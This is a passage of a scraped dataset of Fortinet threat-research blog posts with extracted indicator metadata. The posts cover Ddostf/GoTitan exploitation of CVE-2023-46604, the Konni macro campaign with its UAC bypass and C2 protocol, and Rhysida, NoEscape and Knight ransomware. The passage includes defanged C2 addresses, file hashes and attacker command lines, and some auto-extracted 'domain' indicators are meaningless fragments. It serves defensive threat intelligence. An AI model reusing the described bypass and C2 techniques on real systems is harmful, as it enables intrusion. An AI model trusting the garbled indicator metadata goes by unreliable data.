“ddos.tf” and the Base64-encoded string for “v8.ter.tf.” Its characteristics align with those of a threat actor who had targeted China in 2018. It first verifies that it has root privilege and that the process is running on the device. It then ensures that it will persist on the device by executing the command shown below. Ddostf includes a hard-coded string, “TF-Linux kernel…,” which appends either “SYN-“ or “UDP-“ in its C2 message, depending on whether the process runs with root privileges. Ddostf incorporates 13 attack methods: SYN_Flood, WZSYN_Flood, ICMP_Flood, GET_Flood, GETFT_Flood, HEAD_Flood, POST_Flood, xzcc_Flood, TCP_Flood, WZTCP_Flood, ack_Flood, WZUDP_Flood, and UDP_Flood. Additionally, it defines a function called “DNS_Flood,” which is not included in the current switch cases and is possibly intended for future enhancements. Despite the release of a patch for CVE-2023-46604 over a month ago, threat actors persist in exploiting this vulnerability to distribute malware on susceptible servers. This blog introduces newly discovered threats, including the Golang-based botnet GoTitan and the . NET program “PrCtrl Rat,” which have emerged as a consequence of this exploitation. Additionally, users should remain vigilant against ongoing exploits by Sliver, Kinsing, and Ddostf. It is crucial to prioritize system updates and patching and regularly monitor security advisories to effectively mitigate the risk of exploitation. The malware described in this report are detected and blocked byFortiGuard Antivirusas: XML/Agent. E2ED!trBASH/Miner. BPH!trBASH/Agent.5C93!trELF/GoTitan. AR!trLinux/Sliver. AE!trELF/Ddostf. D!trMSIL/Agent. F3D5!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report: CVE-2023-46604:Apache. ActiveMQ. CVE-2023-46604. Code. Execution The URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. We also suggest that organizations use Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 185[.]122[.]204[.]197194[.]38[.]22[.]5342[.]121[.]111[.]11291[.]92[.]242[.]14199[.]231[.]186[.]249173[.]214[.]167[.]15591[.]92[.]240[.]41 f75cb3e540b96cd54a966c512c854c832807e354772ae1a326b758394b01b607dbf8ba47a5973c86fef32c2d696b09e1930a8384087c62ace1aa5c4084ee1a3f1a3d9960a1685707f8cc2bc447c88f5c3278454fbf0a35a7959717ad835348cdd8f55bbbcc20e81e46b9bf78f93b73f002c76a8fcdb4dc2ae21b8609445c14f90cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879ced09f95f4b4b482207bb300ff6ec15ed8ca5fdde97af02fa9fbe01adaaf7673bbfce7938591dd9fa3e1368d7eb86fc7f11e935349437fc11de4f124bbbc16deef5a36570506bfaff60b684cd26dde3a64a3db4eaa9da78a1434cfd4b390ef3d55acf5ce55678519cd65e001d3f600fa1de288f1cd3e203b4c9439979f4b67175923f2be3d55fcdab7da5cb2be3c16dfcc1582b83d1e4a831236445a52ca81878b90abde8f449bbe6bec9495386fab1833c0654f83c7b2f5ebcf5b14743c30600 botnets,apache FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/gotitan-botnet-exploitation-on-apache-activemq",
      "scraped_at": "2025-07-20T13:51:50.436431",
      "indicators": {
        "ip_address": [
          "91.92.242.14"
        ],
        "domain": [
          "",
          "dos",
          "8",
          "cb",
          "nifo",
          "ml",
          "rcli"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-46604"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.5033308660251666
    }
  },
  {
    "id": "Fortinet_87779",
    "source": "Fortinet",
    "title": "Konni Campaign Distributed Via Malicious Document",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical FortiGuard Labs recently identified the use of a Russian-language Word document equipped with a malicious macro in the ongoing Konni campaign. Despite the document's creation date of September, ongoing activity on the campaign's C2 server is evident in internal telemetry, as shown in Figure 1. This campaign relies on aremote access trojan (RAT)capable of extracting information and executing commands on compromised devices. Operating for several years, this campaign employs diverse strategies for initial access, payload delivery, and establishing persistence within victims' networks. In this blog, we will elaborate on the behavior of the malware at each stage. Upon opening the document, a yellow prompt bar appears, displaying “Enable Content” alongside some ambiguous Russian text (Figure 2). Upon selecting the button, a VBA script is initiated that displays an article in Russian that translates to “Western Assessments of the Progress of the Special Military Operation.” The VBA script (Figure 3) retrieves information from “OLEFormat. IconLabel” and stores it in a temporary folder under the filename “temp.zip.” After extracting the file's contents, it runs the “check.bat” script using the “vbHide” parameter, ensuring the batch script executes without presenting a command prompt window to the user. This method is valuable when a threat actor seeks to discreetly run a script in the background, avoiding user interaction or visible windows. The initial script file, named “check.bat” (Figure 4), performs several checks. Initially, it verifies the presence of a remote connection session. If detected, it directly initiates the “netpp.bat” script. The script then assesses whether the current system is running Windows 10, assigning a value of 1 to the variable “%Num%” regardless of the outcome. This variable later plays a role in selecting the UAC bypass method. This UAC setting is different from KONNI campaigns of the past that set either 4 or 1 for different operation systems. Additionally, it examines whether the system operates on a 64-bit architecture. If so, it renames the corresponding DLL files to “netpp.dll” and “wpns.dll” and removes extraneous DLL files. Finally, it executes “wpns.dll” with three parameters: “QQQQQQQ” as the targeted entry point name, “%Num%” denoting the chosen UAC bypass method, and “netpp.bat” for further action. Each DLL file in the Word document has been compressed using UPX. We will delve into the specifics using the 64-bit version files since their 32-bit counterparts have similar functionalities. Firstly, “wpns.dll” is invoked in the batch file “check.bat.” It is primarily designed for UAC bypass. In the batch file, the parameter is configured as 1, prompting the selection of the sub_180001B90 function, as illustrated in Figure 5. It initiates the process “wusa.exe,” a legitimate Windows utility responsible for installing and uninstalling Windows updates and packages. Because it is signed and trusted by the operating system, it runs with elevated privileges without triggering User Account Control (UAC) prompts. After establishing “wusa.exe,” it then duplicates its access token and proceeds to execute a specified command using “CreateProcessWithLogonW” using that token. Finally, it runs a “netpp.bat” script that inherits the elevated privileges. A segment of the code is shown in Figure 6. Figure 7 shows the content of the batch file \"netpp.bat.\" Here is a concise explanation of its functions: Initially, the program verifies several Windows API functions across various libraries, as shown in Figure 8. If it succeeds in loading those functions, the program continues; otherwise, it returns 0 and terminates. The C2 configuration stored in “netpp.ini” is encrypted using AES-CTR, and the key is derived from the service name established in the preceding step, namely, “netpp.” The first 16 bytes of “netpp.ini” are used as the Initialization Vector (IV) to decrypt and unveil the C2 server list, as seen in Figure 9. The program then adds a registry entry using the command “cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f” and begins gathering information from the compromised system. It uses the command “cmd /c systeminfo” to collect comprehensive details about the target system, including the operating system version, system manufacturer, available hotfixes, system uptime, and network configuration. This data is stored in a temporary file, and the program concatenates the string “rr “ with the system's time to create the file name. Following this, it executes “cmd /c makecab” to compress the file unless the temporary file has one of the following extensions: \".7z,\" \".zip,\" \".rar,\" \".cab,\" \".docx,\" or \".xlsx,\" as shown in Figure 10. Next, using the AES-CTR algorithm, it uses the filename as the key to encrypt the CAB file. The encrypted data is then uploaded to the C2 server via a POST request, employing a hardcoded HTTP syntax, as illustrated in Figure 11. Afterward, it utilizes the command \"cmd /c tasklist” to fetch a list of currently active processes on the system. This helps the threat actor understand the system's status and potentially identify implemented security measures. This data undergoes the same procedure as the earlier process and is transmitted to the C2 server. The entire C2 request is directed to “up.php” with the parameter “name=%PCNAME%,” as shown in Figure 12. Following the upload, the program removes the temporary file to eliminate traces. Next, it attempts to get a payload or command from the C2 server by dispatching an HTTP request to “dn.php” with the parameters “name=%PCNAME%” and “prefix.” The potential values for “prefix” include “cc” followed by a digit or a straightforward string “tt.” The C2 sessions are illustrated in Figure 13. Although the actual command from the C2 server remains undisclosed, we can deduce it from the assembly code within the DLL file. Upon receiving a response from the server, the system dissects the data using “#” as a delimiter, performs base64 decoding, and decrypts the information using AES. The deciphered content is then stored as a temporary file. The program then executes “cmd /c expand –R” to retrieve the payload for subsequent actions, as shown in Figure 14. Figure 15 shows the partial code of how it handles the C2 commands, which include executing a command with specific privileges, downloading a file, and uploading a particular file. This article explores an advanced toolset employed by a sophisticated threat actor within a Word document using batch scripts and DLL files. The payload incorporates a UAC bypass and encrypted communication with a C2 server, enabling the threat actor to execute privileged commands. As this malware continues to evolve, users are advised to exercise caution with suspicious documents. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent. CXE!trBASH/Agent. KON!trW64/Agent. ATC!trW32/Agent. AEQN!trW32/Agent. AFRB!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident ResponseTeam. kmdqj1[.]c1[.]bizouvxu2[.]c1[.]biz9b31n8[.]c1[.]biz3pl0y5[.]c1[.]bizdpgbep[.]c1[.]biz7qnbae[.]c1[.]bizglws5m[.]c1[.]bizewqqa4[.]c1[.]biz3897lb[.]c1[.]biz558ga9[.]c1[.]bizb91stf[.]c1[.]bizbg5pl1[.]c1[.]bizcaoy9n[.]c1[.]bizrziju6[.]c1[.]bizpm90p1[.]c1[.]bizpxyunf[.]c1[.]bizm2jymd[.]c1[.]bizaocsff[.]c1[.]biz6e2nbc[.]c1[.]bizvqt9i1[.]c1[.]biz ac9b814b98a962bc77b2ab862d9c3b1ba5f7e86b80797259b4fcb40bfb389081f07e55ce20e944706232013241d23282e652de2c9514904dede14d4a711a5d1d085cdb09aba0024c0cadbefe428817829bbe4ab0f68598572ebccc2f6f25e78f793b8e72fded73ae6839e678b03bd5c99959f47a1ad632095ba60fb89f66fa9183e66d912ca592bc2accfd9c275647f287b6dc72a859054a348e616537999b64656dd6e67a51aebc6c69dc35eaba2e1502f225ae6fd9d0a5ff70879982427844cfbc7e6a89e4a23a72c7bcd9019197721f18506d9ab842011e0ab9d9eb24c2cc FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/konni-campaign-distributed-via-malicious-document",
      "scraped_at": "2025-07-20T13:51:59.015630",
      "indicators": {
        "ip_address": [],
        "domain": [
          "pns",
          "p",
          "etpp",
          "emp",
          "n",
          "usa",
          "heck"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2546296296296296
    }
  },
  {
    "id": "Fortinet_77881",
    "source": "Fortinet",
    "title": "Investigating the New Rhysida Ransomware",
    "text": "FortiGuard Labs Threat Research The goal of theFortiGuard IR teamis to provide organizations with valuable insights from threat analysis to bolster their security posture. We recently conducted acomprehensive analysis of an incident involving the Rhysida ransomware group, shedding light on their operations, tactics, and impact, including a novel technique involving ESXi-based ransomware. The Rhysida group was first identified in May 2023, when they claimed their first victim. This group deploys a ransomware variant known asRhysidaand also offers it asRansomware-as-a-service (RaaS). The group has listed around 50 victims so far in 2023. The investigation conducted by the FortiGuard IR team and MDR team uncovered some of the techniques and tools used by Rhysida: The initial detection was identified by the FortiGuard MDR team. The threat actor was observed accessing systems in a victim's network and attempting to create memory dumps and gather user data. FortiEDR detected these events, allowing the MDR team to analyze them further. Following the initial detection and triage, the FortiGuard IR team was engaged to conduct a complete analysis. The threat actors abuse legitimate software such as PowerShell to gain information about users and systems within the network, PSExec to schedule tasks and make changes to registry keys to maintain persistence, AnyDesk for remote connections, and WinSCP for file transfers. The threat actors also attempt to exfiltrate data from various systems using MegaSync. The report also covers the additional malware the FortiGuard IR Team identified, along with a technique we don’t often see where the group deployed Windows and Linux binaries. Restricting Veeam access to only designated machines hindered the threat actors from gaining access to the backup files. Moreover, the prudent management of passwords for vSphere fortified the victim's defense. The Rhysida ransomware group is known to target vSphere and look for credentials, so the safeguards that the victim implemented were vital to preventing widespread ransomware of the virtual infrastructure. Staying informed on the landscape of cyber threats is critical. This analysis of the Rhysida group serves as a valuable resource for organizations. By uncovering motives and impact, theFortiGuard IR teams’ findings can guide proactive strategies. For a comprehensive understanding of our investigation into Rhysida, including a list of Fortinet protections able to safeguard your organization, look at the full intrusion analysis reporthere. incident response,ransomware FortiGuard Labs Threat Research CISO Collective CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/investigating-the-new-rhysida-ransomware",
      "scraped_at": "2025-07-20T13:52:07.462101",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3037974683544304
    }
  },
  {
    "id": "Fortinet_62430",
    "source": "Fortinet",
    "title": "Ransomware Roundup – NoEscape",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the NoEscape ransomware. Affected platforms:Microsoft Windows, Linux, and ESXiImpacted parties:Microsoft Windows, Linux, and ESXi UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High NoEscape is a financially motivated ransomware group that emerged in May 2023. The group runs a Ransomware-as-a-Service program. The developer creates and provides necessary pre- and post-infection tools for affiliates to perform malicious activities such as compromising victims, data exfiltration, and encryptor (ransomware) deployments. The group has victimized numerous organizations across multiple industries, including government, energy, hospitals, and physicians’ clinics. The NoEscape ransomware group is believed to be related to the now-defunct Avaddon ransomware group. Information on the infection vector used by the NoEscape ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. According to data collected through Fortinet'sFortiRecon service, the NoEscape ransomware group has targeted multiple industry verticals (Figure 1). Business services were most impacted by the ransomware, followed by the manufacturing and retail sectors. Victims of the NoEscape ransomware also include government organizations, hospitals, and medical clinics. When victim organizations are ranked according to country (Figure 2), the United States leads by a wide margin. As of November 3, 2023, the NoEscape ransomware group had last posted new victims on October 27th. Once a network has been compromised and data has been exfiltrated, the NoEscape attacker deploys and runs a file encryptor, which terminates the following services and processes: The ransomware encrypts files on the compromised systems and appends a “.[random 10-character uppercase alphabet]” extension to the affected files. The ransomware avoids encrypting the following file extensions: The NoEscape ransomware also exempts the following directories from file encryption: It then leaves a ransom note titled “HOW_TO_RECOVER_FILES.txt.” The ransom note instructs victims to visit a TOR site for further instructions. The actual ransom negotiation takes place on TOX. It also insists that the NoEscape ransomware group is financially driven and is not politically motivated. The NoEscape ransomware has variants that affect Linux and VMware ESXi. The NoEscape ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Victims are instructed to visit the TOR site below and enter the unique personal ID listed on the ransom note. As of November 3, the “NoEscape” blog lists 20 active NoEscape ransomware victims. If victims do not comply with the attacker's request, another message is added to the page assigned to each victim urging action. Some of those messages are below: Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the NoEscape ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 0073414c5a03b20f6f255f400291de67f2a7268c461f90ea6ff0355ca31af07a Windows version of NoEscape ransomware 2020cae5115b6980d6423d59492b99e6aaa945a2230b7379c2f8ae3f54e1efd5 4175dae9b268fe5b4f96055ea0376417b5ddc2518d3bd11e20f0f8255bb4621e 4d7da1654f9047b6c6a9d32564a66684407ed587cbaffa54ec1185fd73293d3e 5300d7456183c470a40267da9cd1771d6147445b203d8eb02437348bf3169e0d 53f5c2f70374696ff12adcaaf1bbbe0e5dd1b1995d98f2e876b0671888b43128 62205bf0a23e56524f2f1c44897f809457ad26bc70810008ec5486e17c7e64e2 68bce3a400721d758560273ae024f61603b8a4986440a8ec9e28305d7e6d02b0 68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8 73c19eab8d2ae58db3968dd7de0e745db2d7709859305b113b748bb02494465e 831a2409d45d0c7f15b7f31eddbbdfe7d58414499e81b3da7d9fdee28fafe646 8dd64ea7f226d3eb1e857b0086c0668542652cb37f8142dc000272dbd9569e31 91c515d55fae6d21b106c8c55067ce53d42bef256bd5a385cadd104cf68f64ff 9d346518330eeefbf288aeca7b2b6243bc158415c7fee3f2c19694f0e5f7d51c 10d2b5f7d8966d5baeb06971dd154dc378496f4e5faf6d33e4861cd7a26c91d7 Linux version of NoEscape ransomware 21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6da 46f1a4c77896f38a387f785b2af535f8c29d40a105b63a259d295cb14d36a561 c34c5dd4a58048d7fd164e500c014d16befa956c0bce7cae559081d57f63a243 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup,ransomware-as-a-service FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-noescape",
      "scraped_at": "2025-07-20T13:52:15.114141",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "2020cae5115b6980d6423d59492b99e6aaa945a2230b7379c2f8ae3f54e1efd5",
          "68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8",
          "9d346518330eeefbf288aeca7b2b6243bc158415c7fee3f2c19694f0e5f7d51c",
          "10d2b5f7d8966d5baeb06971dd154dc378496f4e5faf6d33e4861cd7a26c91d7",
          "91c515d55fae6d21b106c8c55067ce53d42bef256bd5a385cadd104cf68f64ff",
          "73c19eab8d2ae58db3968dd7de0e745db2d7709859305b113b748bb02494465e",
          "8dd64ea7f226d3eb1e857b0086c0668542652cb37f8142dc000272dbd9569e31",
          "46f1a4c77896f38a387f785b2af535f8c29d40a105b63a259d295cb14d36a561",
          "53f5c2f70374696ff12adcaaf1bbbe0e5dd1b1995d98f2e876b0671888b43128",
          "62205bf0a23e56524f2f1c44897f809457ad26bc70810008ec5486e17c7e64e2",
          "4175dae9b268fe5b4f96055ea0376417b5ddc2518d3bd11e20f0f8255bb4621e",
          "831a2409d45d0c7f15b7f31eddbbdfe7d58414499e81b3da7d9fdee28fafe646",
          "0073414c5a03b20f6f255f400291de67f2a7268c461f90ea6ff0355ca31af07a",
          "4d7da1654f9047b6c6a9d32564a66684407ed587cbaffa54ec1185fd73293d3e",
          "c34c5dd4a58048d7fd164e500c014d16befa956c0bce7cae559081d57f63a243",
          "5300d7456183c470a40267da9cd1771d6147445b203d8eb02437348bf3169e0d",
          "68bce3a400721d758560273ae024f61603b8a4986440a8ec9e28305d7e6d02b0",
          "21162bbd796ad2bf9954265276bfebea8741596e8fe9d86070245d9b5f9db6da"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.8595988538681948
    }
  },
  {
    "id": "Fortinet_69398",
    "source": "Fortinet",
    "title": "Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever",
    "text": "FortiGuard Labs Threat Research With the growth of Cybercrime-as-a-Service (CaaS) operations and the advent of generative AI, threat actors have more “easy” buttons at their fingertips to assist with carrying out attacks than ever before. By relying on the growing capabilities in their respective toolboxes, adversaries will increase the sophistication of their activities. They’ll launch more targeted and stealthier hacks designed to evade robust security controls, as well as become more agile by making each tactic in the attack cycle more efficient. In our2024 threat predictions report, our FortiGuard Labs team looks at a new era of advanced cybercrime, examines how AI is changing the (attack) game, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations everywhere can enhance their collective resilience against an evolving threat landscape. We've been observing and discussing many fan-favorite attack tactics for years and covered these topicsin past reports. The \"classics\" aren't going away—instead, they're evolving and advancing as attackers gain access to new resources. For example, when it comes to advanced persistent cybercrime, we anticipate more activity among a growing number of advanced persistent threat (APT) groups. In addition to the evolution of APT operations, we predict that cybercrime groups, in general, will diversify their targets and playbooks, focusing on more sophisticated and disruptive attacks, and setting their sights on denial of service and extortion. Cybercrime \"turf wars\" continue, with multiple attack groups homing in on the same targets and deploying ransomware variants, often within 24 hours or less. In fact, we’ve observed such a rise in this type of activity that the FBIissued a warningto organizations about it earlier this year. And let’s not forget about the evolution of generative AI. This weaponization of AI is adding fuel to an already raging fire, giving attackers an easy means of enhancing many stages of their attacks. As we’ve predicted in the past, we’re seeing cybercriminals increasingly use AI to support malicious activities in new ways, ranging from thwarting the detection of social engineering tomimicking human behavior. While cybercriminals will always rely on tried-and-true tactics and techniques to achieve a quick payday, today’s attackers now have a growing number of tools available to them to assist with attack execution. As cybercrime evolves, we anticipate seeing several fresh trends emerge in 2024 and beyond. Here’s a glimpse of what we expect. Next-level playbooks:Over the past few years, ransomware attacks worldwide have skyrocketed, making every organization, regardless of size or industry, a target. Yet, as an increasing number of cybercriminals launch ransomware attacks to attain a lucrative payday, cybercrime groups are quickly exhausting smaller, easier-to-hack targets. Looking ahead, we predict attackers will take a \"go big or go home\" approach, with adversaries turning their focus to critical industries—such as healthcare, finance, transportation, and utilities—that if hacked, would have a sizeable adverse impact on society and make for a more substantial payday for the attacker. They’ll also expand their playbooks, making their activities more personal, aggressive, and destructive in nature. It's a new day for zero days:As organizations expand the number of platforms, applications, and technologies they rely on for daily business operations, cybercriminals have unique opportunities to uncover and exploit software vulnerabilities. We've observed arecord numberof zero days and new Common Vulnerabilities and Exposures (CVEs) emerge in 2023, and that count is still rising. Given how valuable zero days can be for attackers, we expect to see zero-day brokers—cybercrime groups selling zero days on the dark web to multiple buyers—emerge among the CaaS community. N-days will continue to pose significant risks for organizations as well. Playing the inside game:Many organizations are leveling up their security controls and adopting new technologies and processes to strengthen their defenses. These enhanced controls make it more difficult for attackers to infiltrate a network externally, so cybercriminals must find new ways to reach their targets. Given this shift, we predict that attackers will continue to shift left with their tactics, reconnaissance, and weaponization, with groups beginning to recruit from inside target organizations for initial access purposes. Ushering in “we the people” attacks:Looking ahead, we expect to see attackers take advantage of more geopolitical happenings and event-driven opportunities, such as the 2024 U. S. elections and the Paris 2024 games. While adversaries have always targeted major events, cybercriminals now have new tools at their disposal—generative AI in particular—to support their activities. Narrowing the TTP playing field:Attackers will inevitably continue to expand the collection of tactics, techniques, and procedures (TTPs) they use to compromise their targets. Yet defenders can gain an advantage by finding ways to disrupt those activities. While most of the day-to-day work done by cybersecurity defenders is related to blocking indicators of compromise, there's great value in taking a closer look at the TTPs attackers regularly use, which will help narrow the playing field and find potential “choke points on the chess board.” Making space for more 5G attacks:With access to an ever-increasing array of connected technologies, cybercriminals will inevitably find new opportunities for compromise. With more devices coming online every day, we anticipate that cybercriminals will take greater advantage of connected attacks in the future. A successful attack against 5G infrastructure could easily disrupt critical industries such as oil and gas, transportation, public safety, finance, and healthcare. Cybercrime impacts everyone, and the ramifications of a breach are often far-reaching. However, threat actors don't have to have the upper hand. Our security community can take many actions to better anticipate cybercriminals' next moves and disrupt their activities:collaboratingacross the public and private sectors to share threat intelligence, adopting standardized measures for incident reporting, and more. Organizations also have a vital role to play in disrupting cybercrime. This starts with creating a culture of cyber resilience—making cybersecurity everyone’s job—by implementing ongoing initiatives such as enterprisewide cybersecurity education programs and more focused activities like tabletop exercises for executives. Finding ways to shrink the cybersecurity skills gap, such as tapping intonew talent poolsto fill open roles, can help enterprises navigate the combination of overworked IT and security staff as well as the growing threat landscape. And threat sharing will only become more important in the future, as this will help enable the quick mobilization of protections. Download a copy of ourfull predictions reportfor 2024. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio. Sign up for FortiGuard Outbreak Alertsto stay up to speed on the latest breaking threats. Learn more about Fortinet’sfree cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda, or about the FortinetNetwork Security Expert program,Academic Partner program, andVeterans program. threat predictions,CaaS FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/2024-threat-predictions-chained-ai-and-caas-operations",
      "scraped_at": "2025-07-20T13:52:22.331237",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3141831238779174
    }
  },
  {
    "id": "Fortinet_88263",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Knight",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Knight ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Knight is a relatively new ransomware group that arrived in August 2023. Like many attackers, the gang behind this variant employs double extortion tactics, where the Knight ransomware encrypts files on victims’ machines and exfiltrates data for extortion purposes. The predecessor of Knight, Cyclops, had multi-OS tools for Windows, Linux, and Mac OS. So, while FortiGuard Labs had only located a Windows version of the Knight ransomware at the time of our investigation, it seems likely that other versions may be on the way. According to anadvisoryby CERT Italy in early September, Knight targeted Italian organizations with phishing campaigns using emails with malicious attachments. The same was reported in early August by security researcher@felixw3000. In addition, Remcos and Qakbot malware are known to deliver the Knight ransomware to compromised machines. According to data collected through Fortinet'sFortiRecon service, the Knight ransomware group has targeted multiple industry verticals. While Retail was most affected by the Knight ransomware, the group also victimized organizations in healthcare, including hospitals, physicians’ clinics, and dental offices, indicating that the threat actor has no reservations about impacting people who need medical care. When classifying victim organizations by country, the United States is in first place by a significant margin. As of October 20, 2023, the Knight ransomware group had last posted new victims on October 18th. Once a network has been compromised and data has been exfiltrated, files encrypted by the Knight ransomware are appended with a “.knight_l” file extension. It then drops a ransom note labeled, “How To Restore Your Files.txt.” Because the Knight ransomware targets enterprises, the ransom fee is set at a relatively high price. However, the Bitcoin wallet in this ransom note had no recorded transactions at the time of our investigation. The Knight ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. The group also uses another TOR site for disclosing stolen data and has abused several publicly available file-sharing services, such as Mega, Gofile, and UploadNow. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Knight ransomware samples with the following 